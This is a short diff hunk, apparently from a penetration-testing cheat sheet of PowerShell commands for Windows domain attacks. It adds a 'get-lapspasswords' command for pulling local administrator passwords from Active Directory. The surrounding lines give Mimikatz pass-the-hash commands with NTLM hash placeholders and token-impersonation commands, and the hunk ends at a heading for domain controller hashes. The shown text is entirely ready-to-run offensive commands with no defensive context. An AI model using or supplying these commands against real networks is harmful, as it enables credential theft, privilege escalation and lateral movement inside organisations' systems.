@@ -222,6 +222,7 @@ invoke-mimikatz -command '"sekurlsa::pth /user:<user> /domain:<dom> /ntlm:<hash>
 invoke-mimikatz -computer 10.0.0.1 -command '"sekurlsa::pth /user:<user> /domain:<dom> /ntlm:<hash> /run:c:\\temp\\run.bat"'
 invoke-tokenmanipulation | select-object domain, username, processid, iselevated, tokentype | ft -autosize | out-string
 invoke-tokenmanipulation -impersonateuser -username "domain\\user"
+get-lapspasswords
 
 Credentials / Domain Controller Hashes:
 ============================================
